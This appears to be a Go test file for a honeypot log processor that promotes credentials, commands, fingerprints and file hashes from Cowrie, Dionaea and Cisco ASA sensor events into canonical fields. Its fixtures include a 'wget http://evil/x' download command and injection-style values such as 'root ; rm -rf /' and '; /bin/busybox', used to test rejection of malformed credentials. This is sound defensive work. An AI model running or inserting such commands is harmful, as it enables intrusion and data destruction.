package main

import "testing"

func TestPromoteCowrieFieldsCredsOnLogin(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.login.failed", "username": "root", "password": "arris"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "root" || e["canonical_pass"] != "arris" {
		t.Fatalf("got user=%v pass=%v", e["canonical_user"], e["canonical_pass"])
	}
}

func TestPromoteCowrieFieldsRejectsInvalidCredentialPair(t *testing.T) {
	// A command-injection-looking password must not be promoted, matching
	// dashboard/aggregate.go's own validCredentialPair gate on TopCreds.
	e := map[string]any{"eventid": "cowrie.login.failed", "username": "root", "password": "; /bin/busybox"}
	if promoteCowrieFields(e) {
		t.Fatalf("expected no change for an invalid credential pair, got %+v", e)
	}
	if _, ok := e["canonical_user"]; ok {
		t.Fatalf("canonical_user should not be set: %+v", e)
	}
}

func TestPromoteCowrieFieldsLoginWithPubkeyFingerprint(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.login.success", "username": "root", "password": "", "fingerprint": "aa:bb:cc"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_fingerprint"] != "aa:bb:cc" || e["canonical_fingerprint_kind"] != "SSH pubkey" {
		t.Fatalf("got %+v", e)
	}
	// user/pass alone ("root"/"") fails validCredentialPair (empty pass is
	// fine, but let's confirm creds aren't force-set when password is
	// legitimately empty for a pubkey-only attempt with no password field).
	if _, ok := e["canonical_user"]; !ok {
		t.Fatalf("expected canonical_user to still be set for a non-empty username: %+v", e)
	}
}

func TestPromoteCowrieFieldsCommand(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.command.input", "input": "wget http://evil/x"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_command"] != "wget http://evil/x" {
		t.Fatalf("got %v", e["canonical_command"])
	}
}

func TestPromoteCowrieFieldsClientVersionAndKex(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.client.version", "version": "SSH-2.0-libssh2"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_client_version"] != "SSH-2.0-libssh2" {
		t.Fatalf("got %v", e["canonical_client_version"])
	}
	if e["canonical_fingerprint"] != "SSH-2.0-libssh2" || e["canonical_fingerprint_kind"] != "SSH client" {
		t.Fatalf("got %+v", e)
	}

	e2 := map[string]any{"eventid": "cowrie.client.kex", "hassh": "deadbeef"}
	if !promoteCowrieFields(e2) {
		t.Fatal("expected a change")
	}
	if e2["canonical_fingerprint"] != "deadbeef" || e2["canonical_fingerprint_kind"] != "HASSH" {
		t.Fatalf("got %+v", e2)
	}
}

func TestPromoteCowrieFieldsShasum(t *testing.T) {
	e := map[string]any{"eventid": "cowrie.session.file_download", "shasum": "abc123"}
	if !promoteCowrieFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_shasum"] != "abc123" {
		t.Fatalf("got %v", e["canonical_shasum"])
	}
}

func TestPromoteCowrieFieldsIgnoresNonCowrieAndUncasedEvents(t *testing.T) {
	if promoteCowrieFields(map[string]any{"eventid": "dionaea.connection.tcp.accept"}) {
		t.Fatal("expected no change for a non-cowrie eventid")
	}
	if promoteCowrieFields(map[string]any{"eventid": "cowrie.session.connect"}) {
		t.Fatal("expected no change for a cowrie eventid with no canonical field")
	}
}

func TestPromoteDionaeaFieldsCredentials(t *testing.T) {
	e := map[string]any{
		"credentials": []any{map[string]any{"username": "admin", "password": "admin"}},
	}
	if !promoteDionaeaFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "admin" || e["canonical_pass"] != "admin" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteDionaeaFieldsNoCredentials(t *testing.T) {
	e := map[string]any{"connection": map[string]any{"protocol": "smbd"}}
	if promoteDionaeaFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteDionaeaIncidentFieldsLoginCreds(t *testing.T) {
	e := map[string]any{
		"origin": "dionaea.ftp.login",
		"data":   map[string]any{"username": "anon", "password": "guest"},
	}
	if !promoteDionaeaIncidentFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_user"] != "anon" || e["canonical_pass"] != "guest" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteDionaeaIncidentFieldsNonLoginKindSkipsCreds(t *testing.T) {
	// Same shape as a login incident but the origin kind carries neither
	// "login" nor "auth" -- must not be promoted as a credential pair.
	e := map[string]any{
		"origin": "dionaea.connection.tcp.accept",
		"data":   map[string]any{"username": "anon", "password": "guest"},
	}
	if promoteDionaeaIncidentFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteDionaeaIncidentFieldsShasumDirect(t *testing.T) {
	e := map[string]any{
		"origin": "dionaea.download.complete.unique",
		"data":   map[string]any{"sha256": "deadbeef"},
	}
	if !promoteDionaeaIncidentFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_shasum"] != "deadbeef" {
		t.Fatalf("got %v", e["canonical_shasum"])
	}
}

func TestPromoteDionaeaIncidentFieldsShasumFromDownloadBasename(t *testing.T) {
	hash := "0123456789abcdef0123456789abcdef01234567"
	e := map[string]any{
		"origin": "dionaea.download.complete.unique",
		"data":   map[string]any{"url": "http://x/" + hash},
	}
	if !promoteDionaeaIncidentFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_shasum"] != hash {
		t.Fatalf("got %v", e["canonical_shasum"])
	}
}

func TestPromoteDionaeaIncidentFieldsNonDionaeaOriginSkipped(t *testing.T) {
	e := map[string]any{"origin": "other.thing", "data": map[string]any{"sha256": "deadbeef"}}
	if promoteDionaeaIncidentFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteCiscoAsaFieldsCommandAndFingerprint(t *testing.T) {
	e := map[string]any{
		"event":   "post",
		"data":    "user=admin&pass=admin",
		"headers": map[string]any{"User-Agent": "curl/8.0", "X-JA4": "t13d..."},
	}
	if !promoteCiscoAsaFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_command"] != "user=admin&pass=admin" {
		t.Fatalf("got %v", e["canonical_command"])
	}
	// JA4 takes priority over User-Agent when both are present.
	if e["canonical_fingerprint"] != "t13d..." || e["canonical_fingerprint_kind"] != "JA4" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteCiscoAsaFieldsUserAgentFallback(t *testing.T) {
	e := map[string]any{"event": "get", "headers": map[string]any{"User-Agent": "curl/8.0"}}
	if !promoteCiscoAsaFields(e) {
		t.Fatal("expected a change")
	}
	if e["canonical_fingerprint"] != "curl/8.0" || e["canonical_fingerprint_kind"] != "User-Agent" {
		t.Fatalf("got %+v", e)
	}
}

func TestPromoteCiscoAsaFieldsNoHeadersNoCommand(t *testing.T) {
	e := map[string]any{"event": "https_listening"}
	if promoteCiscoAsaFields(e) {
		t.Fatalf("expected no change: %+v", e)
	}
}

func TestPromoteCanonicalFieldsDispatchesByPersona(t *testing.T) {
	cases := []struct {
		persona string
		e       map[string]any
		want    bool
	}{
		{"cowrie", map[string]any{"eventid": "cowrie.command.input", "input": "id"}, true},
		{"dionaea", map[string]any{"credentials": []any{map[string]any{"username": "a", "password": "b"}}}, true},
		{"dionaea-incident", map[string]any{"origin": "dionaea.ftp.login", "data": map[string]any{"username": "a", "password": "b"}}, true},
		{"cisco-asa-honeypot", map[string]any{"event": "post", "data": "x"}, true},
		{"dns-honeypot", map[string]any{"event": "query", "query": "example.com"}, false},
		{"conpot", map[string]any{"data_type": "modbus", "request": "\x00\x01"}, false},
		{"unknown-sensor", map[string]any{"eventid": "cowrie.login.success", "username": "a", "password": "b"}, false},
	}
	for _, tc := range cases {
		got := promoteCanonicalFields(tc.persona, tc.e)
		if got != tc.want {
			t.Errorf("promoteCanonicalFields(%q, %+v) = %v, want %v", tc.persona, tc.e, got, tc.want)
		}
	}
}

func TestValidCredentialPairMatchesDashboardBehavior(t *testing.T) {
	cases := []struct {
		user, pass string
		want       bool
	}{
		{"", "", false},
		{"root", "toor", true},
		{"root", "; /bin/busybox", false},
		{"root ; rm -rf /", "x", false},
		{"root", "powershell -enc ...", false},
	}
	for _, tc := range cases {
		if got := validCredentialPair(tc.user, tc.pass); got != tc.want {
			t.Errorf("validCredentialPair(%q, %q) = %v, want %v", tc.user, tc.pass, got, tc.want)
		}
	}
}
